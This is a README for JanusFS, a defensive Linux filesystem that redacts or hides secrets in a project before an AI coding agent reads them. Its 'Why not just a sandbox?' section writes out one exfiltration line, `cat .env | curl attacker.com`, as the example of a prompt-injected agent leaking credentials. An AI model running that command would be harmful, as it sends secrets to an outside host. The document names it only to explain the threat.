# JanusFS

[![Go 1.26+](https://img.shields.io/badge/Go-1.26%2B-blue.svg)](https://go.dev/dl/)
[![CI](https://github.com/sarathsp06/janusfs/actions/workflows/ci.yml/badge.svg)](https://github.com/sarathsp06/janusfs/actions/workflows/ci.yml)
[![Platform: Linux](https://img.shields.io/badge/platform-Linux-lightgrey.svg)](https://github.com/sarathsp06/janusfs)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**JanusFS is a policy-enforcing filesystem for AI agents.** Sandboxes (Seatbelt, Landlock, bubblewrap, Docker) answer one question per path: allow or deny. Deny breaks the agent; allow leaks the secret. JanusFS adds the third answer — **masked**: a filtered virtual filesystem backed by your real project, where allowed files pass through, sensitive spans are redacted in place byte-for-byte, and forbidden files fail closed with `EACCES`. Run it as `janusfs exec -- <your-agent>` and the agent lives *inside* that boundary — kernel-enforced on Linux — composing with whatever sandbox you already run.

![JanusFS — Filesystem boundary illustration](docs/janus_art.png)

> In Roman myth, Janus is the two-faced god of doorways — he looks both ways. JanusFS stands at the doorway between your code and any untrusted agent, deciding which face of each file is safe to show.

## Quickstart

JanusFS runs on **Linux only**. On a Mac or Windows, run it inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) launched with `--device /dev/fuse --cap-add SYS_ADMIN`.

```bash
# 1) install the FUSE runtime
sudo apt-get install -y fuse3 libfuse3-dev        # Debian/Ubuntu
# sudo dnf install -y fuse3 fuse3-devel           # RHEL/Fedora

# 2) install JanusFS (or grab a Linux tarball from GitHub Releases)
go install github.com/sarathsp06/janusfs/cmd/janusfs@latest

# 3) seed secure defaults and preview before you mount
cd my-project
janusfs init                     # writes a .janusfs.yml template
janusfs check --secrets          # warn about likely secrets still readable
janusfs explain .env             # trace which rule decides a file's fate

# 4) run your agent INSIDE the boundary (strongest: kernel-enforced)
janusfs exec -- aider            # the agent + everything it spawns sees the filtered view
janusfs exec --net=none -- aider # …and cannot reach the network to exfiltrate what it read
```

That's it. Inside the view, `cat .env` yields `API_KEY=****` (same length), `.env` still lists with its real size, and a hidden `id_rsa` fails closed:

```bash
$ cat .env
API_KEY=****************************
$ cat id_rsa
cat: id_rsa: Permission denied
```

Prefer a persistent mount over `exec`? `janusfs daemon --background` then `janusfs mount .` gives you a long-lived mountpoint and a dashboard — see [The daemon](#the-daemon).

## Features

- **Three faces per file, not two.** `allow` passes through, `hide` fails closed (`EACCES`), `mask` redacts secret spans **byte-for-byte** (`*`) so file sizes and offsets never change and tooling stays intact. Precedence is strict: `Hidden > Masked > Allowed`.
- **Kernel-enforced boundary.** `janusfs exec -- <agent>` runs the whole process tree in a private mount namespace where the filtered view *replaces* the source at its own path — `git`, `npm`, `grep`, every child inherit it, and no child can reach the unfiltered tree by any path.
- **Optional network isolation.** `janusfs exec --net=none` runs the agent with no network at all (loopback only), kernel-enforced — so bytes it read cannot be exfiltrated. Deny-all, opt-in; default is `host` (no isolation).
- **One config you already understand.** A single `.janusfs.yml` with `.gitignore`-style globs plus a named pattern library (`env-value`, `aws-key`, `jwt`, …). Machine-wide defaults live in `~/.janusfs/config/`.
- **Fail-closed, always.** Any parser error, cache fault, or redactor panic resolves the path to Hidden — never raw bytes. Real files are never modified; redacted bytes live only in RAM.
- **Daemon + dashboard.** One background daemon owns every mount, resumes them after a reboot, and serves a single dashboard at `http://127.0.0.1:7381/`. CLI commands are short-lived and return immediately.
- **Composes with your sandbox.** JanusFS masks *bytes*; a sandbox protects the *machine*. Run `janusfs exec` inside Seatbelt/Landlock/bubblewrap/Docker — they answer allow/deny, JanusFS answers "masked".

## Why

The repository root is a threshold: it holds both code the agent should reason about and secrets it must never see — `.env`, private keys, cloud configs. The obvious workarounds all fail:

- **Blanket-deny** a directory and the agent breaks when it legitimately needs to know a file exists.
- **Blanket-allow** and secrets leak on the first `cat`, `grep`, or `find`.
- **Scrub before hand-off** and any later read — or a fresh read after the scrub — still has the raw bytes.

JanusFS resolves this per-file, per-read, at the FS boundary, through one code path that fails **closed** on any error.

## How it works

When an agent reads a file, JanusFS resolves one of three decisions against a compiled policy snapshot:

```mermaid
flowchart LR
  Agent["Agent (untrusted)"]
  Janus["JanusFS policy-enforced filesystem<br/>(compiled policy snapshot)"]
  Disk["Real files on disk (trusted)"]
  Redact["Redaction Layer<br/>(RAM cache)"]
  Deny["Denied (EACCES)"]

  Agent -->|read/open/readdir| Janus
  Janus -->|ALLOWED| Disk
  Janus -->|MASKED| Redact
  Janus -->|HIDDEN| Deny
  Redact --> Agent
  Disk --> Agent
```

```text
Agent -> JanusFS -> decision:
- ALLOWED -> passthrough to disk -> agent sees raw bytes
- MASKED  -> redaction layer (RAM cache) -> agent sees redacted bytes (same length)
- HIDDEN  -> deny (EACCES) -> agent cannot read
```

A long-running **daemon** owns every mount. You drive it with short-lived CLI commands that talk to it over a local unix socket and return immediately; the daemon holds the FUSE mounts, resumes them after a reboot, and serves one dashboard for all of them. The agent only ever touches the mountpoint.

```
  ┌─ you (trusted) ─────────────┐          ┌─ agent (untrusted) ─────────┐
  │  janusfs mount <src>        │          │  cat / grep / open / readdir│
  │  janusfs umount <src>       │          └──────────────┬──────────────┘
  └──────────────┬──────────────┘                         │
                 │ command over unix socket               │ filesystem calls
                 │ ~/.janusfs/daemon.sock                 ▼
                 ▼                              ┌─────────────────────────┐
      ┌──────────────────────────┐  owns &     │ policy-enforced mount   │
      │      janusfs daemon      │──starts────► │  one FUSE server /mount │
      │  • owns every mount      │             └────────────┬────────────┘
      │  • resumes past mounts   │                          │ consult compiled rules
      │    on start (reboot-safe)│                          │ on every open/read/readdir
      │  • serves the dashboard  │◄─── stats/events ────────┤
      │    http://127.0.0.1:7381 │                          ▼
      └──────────────────────────┘             ┌─────────────────────────┐
                                               │  Allowed → passthrough  │
                                               │  Masked  → redact in RAM│
                                               │  Hidden  → EACCES       │
                                               └────────────┬────────────┘
                                                            ▼
                                            Real files on disk (never modified)
```

The engine reads `.janusfs.yml` from the mount root down (and `~/.janusfs/config/` if present) and compiles policy into an immutable snapshot. Every open, read, and readdir consults that snapshot. Redaction is **byte-length preserving** (`*` replaces every masked byte), so sizes and offsets stay identical. Any error resolves to **Hidden**.

## Enforcement: run your agent inside the boundary

Pointing an agent *at* a mountpoint is only as good as the agent's discipline — nothing stops a process from reaching the real source at its own path. To get a boundary the agent cannot step around, put its whole process tree inside the filtered view. That is `janusfs exec`, and it is the strongest way to run JanusFS.

**Own the process tree, not one channel.** An agent has many ways to touch the filesystem — its `read_file` tool, its Bash tool, `git`, a build, a subprocess. Filtering any single one leaves the others open. On Linux `janusfs exec` confines the *entire* subprocess tree at once: `git`, `npm`, `grep`, and every child inherit the filtered view transitively — allowed files pass through, masked files read as `****`, hidden files fail closed — with no per-tool wiring and no way for a child to opt out.

Concretely, `janusfs exec` runs the command in a private mount namespace (`CLONE_NEWNS`) where the filtered view *replaces* the source at its own path, for both read and write. From inside, the unfiltered tree does not exist. No daemon required, no path rewriting. (One consequence of the user namespace: the command sees itself as uid 0 — see `janusfs exec --help`.)

### Network isolation (`--net=none`)

Masking keeps secret *bytes* out of the agent; a network boundary keeps whatever it *did* read from leaving the box. `janusfs exec --net=none` runs the command in a network namespace with only a loopback interface and no external route — deny-all, kernel-enforced:

```bash
janusfs exec --net=none -- aider     # no network at all; loopback only
janusfs exec --net=host -- aider     # share the host network (default; no isolation)
```

The default when `--net` is omitted resolves `JANUSFS_EXEC_NET` → `exec_net` in `~/.janusfs/settings.json` → `host`. This is deny-all, not an egress allowlist (reach some hosts, not others) — that is the container's job. See [`SPEC.md`](SPEC.md) §20.

### Why not just a sandbox?

Sandboxes and JanusFS answer different questions. A sandbox protects the *machine* from the agent; JanusFS keeps secret *bytes* out of the agent's context, transcript, and model provider. Deny `.env` under Landlock and the agent breaks when it legitimately needs the file's shape; allow it, and the day a prompt injection lands, `cat .env | curl attacker.com` exfiltrates it through a channel no per-tool filter sees. Under JanusFS the raw bytes never enter the process tree at all. Run both: the sandbox denies the machine, JanusFS masks the secrets.

```bash
# compose: your harness's sandbox (or a devcontainer) outside, janusfs inside
janusfs exec -- claude      # inside a devcontainer: add --device /dev/fuse to runArgs
```

> **Two caveats.** (1) Wrapping an interactive editor is not the same as wrapping a headless agent: `janusfs exec -- <your-editor>` puts *your own* tools inside the view too, so a masked file you `git add` stages `****` into real git. (2) Because `.git/` passes through to the real object store, `git add` on a masked file stages the `****` bytes. JanusFS warns loudly — `janusfs check` and `janusfs exec` both report every masked file git would stage. Keep secret files out of the agent's commits (they are typically `.gitignore`d), or give the agent a scratch clone.

**Non-Linux is refused, not faked.** `janusfs mount` and `janusfs exec` error out on macOS, Windows, and other OSes rather than pretend an advisory mount is a boundary. A path-preserving macOS mode was considered and rejected (see [`SPEC.md`](SPEC.md) §20). To use JanusFS on a Mac, run the agent in a Linux container/VM and use `janusfs exec` inside it.

## The three faces

| State       | Appears in listing | `getattr` size | `read` | `write` |
|-------------|--------------------|----------------|--------|---------|
| **Allowed** | yes                | real           | native passthrough | native passthrough |
| **Masked**  | yes                | **real** (byte-length preserved) | `*`-redacted content | **EACCES** (read-only) |
| **Hidden**  | yes                | real           | **EACCES** | **EACCES** |

**Precedence is strict:** `Hidden > Masked > Allowed`.
**Fail-closed:** any rule-resolution or parser error resolves that path to Hidden.

## Configuration

### `.janusfs.yml`

One policy file controls all three concepts:

```yaml
version: 1

hide:
  - "*.pem"
  - "*.key"
  - id_rsa*
  - .aws/credentials
  - .terraform/
  - node_modules/
  - build/

allow:
  - .aws/known_public_config

mask:
  - paths:
      - "*.env*"
    patterns:
      - env-value

  - paths:
      - "**/*"
    patterns:
      - aws-key
      - github-token
      - private-key
      - jwt

  - paths:
      - config/**/*.yaml
    patterns:
      - generic-secret
      - db-uri

  - paths:
      - secrets/*   # no patterns → whole-file mask

  - paths:
      - "**/*.log"
    patterns:
      - /token=([A-Za-z0-9_-]{20,})/
```

`hide` and `allow` use gitignore-style glob semantics. Rules are **hierarchical**: files further down the tree override shallower ones, and `allow` can re-include a previously hidden file — but **never** something under a directory that itself resolves to Hidden, and **never** a path the [global rule level](#global-rules-machine-wide-defaults) already hid.

`mask` has two dimensions: *which files* to redact (`paths`) and *what inside them* to redact (`patterns`). Omit `patterns` to mask the whole file.

- Masked spans are replaced byte-for-byte with `*`. **File sizes never change.**
- Capture group 1 of a regex is the masked span; without a group, the whole match is masked.
- Multiple mask rules for the same path **accumulate** (set union of patterns).

### Global rules (machine-wide defaults)

Set rules that apply to every mount on your machine — for personal always-hide patterns you don't want to duplicate into every repo:

```bash
janusfs init --global    # writes ~/.janusfs/config/.janusfs.yml
```

Global rules are treated as an **ancestor level above every mount root**, and act as a **fail-closed floor**: a repo's own rules can freely override each other as usual, but no in-tree rule may re-include a path the global level Hid, or un-mask a path it Masked. `janusfs check`/`explain` flag any in-tree negation that has no effect for this reason.

The `.janusfs` directory layout:

```
~/.janusfs/
├── config/           # global .janusfs.yml
├── run/              # pidfiles for active mounts
└── history/          # SQLite rollups for the dashboard
```

Perms: `~/.janusfs/` is `0700`, files inside are `0600`.

## Built-in patterns

Reserved names — user `/regex/` cannot shadow these. Every builtin is unit-tested against a fixture corpus of true positives and false-positive traps.

| Name              | Masks                                                  |
|-------------------|--------------------------------------------------------|
| `env-value`       | RHS of `KEY=value` in dotenv/shell exports             |
| `aws-key`         | `AKIA…`/`ASIA…`/`ABIA…`/`ACCA…` IDs, and `aws_secret_access_key` values |
| `private-key`     | PEM `BEGIN PRIVATE KEY … END PRIVATE KEY` blocks       |
| `jwt`             | `eyJ…` three-segment tokens                            |
| `db-uri`          | `user:pass` credentials inside `scheme://user:pass@host` URIs |
| `github-token`    | `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_` tokens          |
| `generic-secret`  | `password:` / `secret:` / `api-key:` values (6+ chars) |
| `whole-file`      | sentinel: mask every byte                              |

Print the exact regexes with `janusfs patterns` (or `--json`).

## The daemon

`janusfs daemon` is the one long-running process; everything else is a thin client that talks to it over `~/.janusfs/daemon.sock` and exits.

- **Owns every mount.** `janusfs mount <src>` hands the mount to the daemon and returns immediately — your terminal is free.
- **Restart-safe.** Every successful mount is recorded in `~/.janusfs/mounts.json`; the next daemon start remounts it automatically. `janusfs umount` removes the entry. Startup prunes records whose source disappeared.
- **One port.** A combined index at `http://127.0.0.1:7381/` lists every live mount and routes per-mount dashboards/APIs under subpaths. Change it with `--ui-port`.
- **Foreground or detached.** `janusfs daemon` runs in the foreground (Ctrl-C to stop); `--background` detaches, logs to `~/.janusfs/logs/daemon.log`, and returns once the socket is up (`janusfs logs -f` tails it).
- **Clean shutdown.** Ctrl-C/`SIGTERM` unmounts everything; if FUSE won't release cleanly it falls back to `fusermount3`/`fusermount`/`umount`.

```bash
janusfs daemon --background # start it detached
janusfs logs -f            # tail the daemon log
janusfs mount ~/proj       # hand a mount to the daemon; returns at once
janusfs mount ~/proj ~/pv  # or mount at a short path you choose
janusfs update ~/proj      # re-apply edited .janusfs.yml (no remount)
janusfs path ~/proj        # print the mountpoint: cd "$(janusfs path ~/proj)"
janusfs umount ~/proj      # unmount by source path OR mountpoint
janusfs mounts             # list active and recorded mounts
```

By default the mountpoint mirrors the source's full path under your mount root (e.g. `~/.janusfs/mounts/home/you/my-project`), so two sources never collide. Pass an explicit mountpoint (`janusfs mount ~/proj ~/pv`) for a shorter path, or `--name "My Project"` for a dashboard label.

There's no file watcher (watching a large tree burns inotify watches, and the cgo-free native APIs are forbidden here) — freshness is enforced at two levels:

- **Content is always correct.** Every masked read revalidates the real file's `(mtime, size, inode)` before serving, so a concurrent content edit is always caught.
- **In-tree rule changes** are picked up the next time anything is opened near them. If nothing is opened after the edit, or you edit **global** rules, run `janusfs update` (or click **Reload rules** in the dashboard).

### Recovering a stale or broken mount

If you see `device not configured`, `ENXIO`, or `Transport endpoint is not connected`, the kernel may hold a stale FUSE mount. Daemon startup clears these automatically; to do it by hand:

```bash
janusfs umount <mountpoint-or-src>                                          # ask the daemon (or OS fallback)
fusermount3 -u <mountpoint> || fusermount -u <mountpoint> || umount <mp>    # if the kernel mount remains
fusermount3 -uz <mountpoint> || umount -l <mountpoint>                       # lazy detach if "not connected"
janusfs doctor                                                              # inspect runtime health
```

## CLI reference

| Command | Purpose |
|---------|---------|
| `janusfs install` | Optional setup: choose a custom mount root with `--root` (saved to `~/.janusfs/settings.json`). `--global-rules` also seeds `~/.janusfs/config/`. |
| `janusfs daemon` | Run the long-lived daemon: owns every mount, resumes recorded ones, serves the dashboard. `--background`, `--ui-port` (default 7381), `--no-open`, `--debug`. |
| `janusfs logs [-f]` | Show the background daemon's log; `-f` follows it. |
| `janusfs mount <src> [mountpoint]` | Ask the daemon to mount a policy-enforced view and return immediately. `--name "<label>"` sets a dashboard name only. |
| `janusfs mounts [--json]` | List active daemon mounts and recorded entries (`mounted`, `recorded`, `missing-src`, `stale`, `error`). |
| `janusfs update [src\|mountpoint\|configpath]` | Re-apply edited `.janusfs.yml` without remounting (no arg = all mounts). |
| `janusfs path <src>` | Print the mountpoint for a mounted source. |
| `janusfs umount <mountpoint\|src>` | Unmount via the daemon; prunes stale entries; OS-unmount fallback if no daemon. |
| `janusfs paths` | List the config/data paths JanusFS uses and whether each exists. |
| `janusfs init [dir]` | Write secure-default `.janusfs.yml` to `[dir]` (default cwd). `--global` writes to `~/.janusfs/config/`. |
| `janusfs check [path]` | Static linter: unknown builtins, bad regex (with its fail-closed consequence), directory-mask globs that can never mask, no-op negations. `--secrets` adds a heuristic scan for likely-Allowed secrets; `--matches` lists Hidden/Masked files; `--json`. |
| `janusfs patterns` | List every reserved built-in mask pattern with its regex. `--json`. |
| `janusfs explain <path>` | Trace why one path resolves the way it does; prints every contributing rule. `--json`, `--root`. |
| `janusfs doctor` | Runtime health: FUSE status, active mounts, stale-mount/watchdog checks. |
| `janusfs exec [--net=host\|none] -- <command> [args...]` | Run a command inside a real, kernel-enforced view of the current source tree (private mount namespace; no daemon required). `--net=none` denies all network (loopback only). Linux-only: refuses on other OSes. |

All commands support `--help` and script-friendly exit codes; errors print as a one-line cause, never a Go stack trace.

### `janusfs explain` example

```
$ janusfs explain --root ~/proj ~/proj/.env
.env -> MASKED
  patterns: [env-value]
  deciding rule: /home/you/proj/.janusfs.yml:3
  evaluation trace (in order applied):
    /home/you/.janusfs/config/.janusfs.yml:6  "*.env*"  -> masked
    /home/you/proj/.janusfs.yml:3             "*.env*"  -> masked
```

## Security model

- **Trust boundary:** the mountpoint and the local HTTP dashboard. The agent is untrusted; the user operating the CLI is trusted. **The boundary is kernel-enforced on Linux** (via `janusfs exec`'s private mount namespace), the only platform JanusFS runs on. JanusFS is not a sandbox against a process that has another way to the source.
- **Optional network deny.** `janusfs exec --net=none` runs the command in a network namespace with only loopback, kernel-enforced — closing the exfiltration channel for bytes the agent already read.
- **Agents cannot weaken policy.** `.janusfs.yml` is read-only through the mount. The dashboard's mutating endpoints require the per-mount bearer token and act as the trusted user, never through the agent's mount. The dashboard never serves raw source bytes.
- **Fail-closed under all faults.** Parser errors, cache corruption, redactor panics → paths read as Hidden (`EACCES`), never raw.
- **No content on disk.** Redacted bytes live only in RAM; the history DB stores per-path counters and coverage, **never** file contents.
- **Read path validates every time.** Every masked-file read revalidates `(mtime, size, inode)` against the cache key before serving — the authoritative change detector.
- **Descriptor-relative reads.** The daemon opens the source directory once at mount time; every masked read goes through that retained descriptor with `O_NOFOLLOW`, so swapping a checked path for a symlink between decision and read cannot redirect it.
- **`~/.janusfs/` perms:** directory `0700`, files `0600`.

See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full boundaries / assets / leak-channels table.

## Comparison to alternatives

| Approach | Secrets *inside* useful files? | Survives agent iterations? | Zero config-per-repo? | Perf near-native? |
|---|:-:|:-:|:-:|:-:|
| `.gitignore` / `.aiexclude` | ❌ (whole-file only) | ✅ | ⚠️ per-repo | ✅ |
| Harness sandbox (Seatbelt / Landlock / bubblewrap) | ❌ (allow or deny only) | ✅ | ✅ | ✅ |
| Docker / devcontainer bind mount | ❌ (hands the agent the raw file) | ✅ | ⚠️ image setup | ✅ |
| One-shot secret-scrubbing before hand-off | ⚠️ (frozen snapshot) | ❌ | ✅ | ✅ |
| Custom LLM tool wrappers that filter reads | ⚠️ (per-tool, easily bypassed) | ⚠️ (per-tool discipline) | ⚠️ | ⚠️ |
| **JanusFS** | ✅ (per-span, byte-length preserving) | ✅ (FS boundary, per-read) | ✅ machine-wide via `~/.janusfs/config/` | ✅ (steady-state cache) |

Sandboxes and containers are *complements*, not competitors — they decide allow/deny and protect the machine; JanusFS masks. Run `janusfs exec` inside them.

## Development

For building, formatting, running unit and FUSE integration tests, and validating the release config locally, see the **[Development Guide](docs/DEVELOPMENT.md)**.

## License

JanusFS is licensed under the [MIT License](LICENSE).
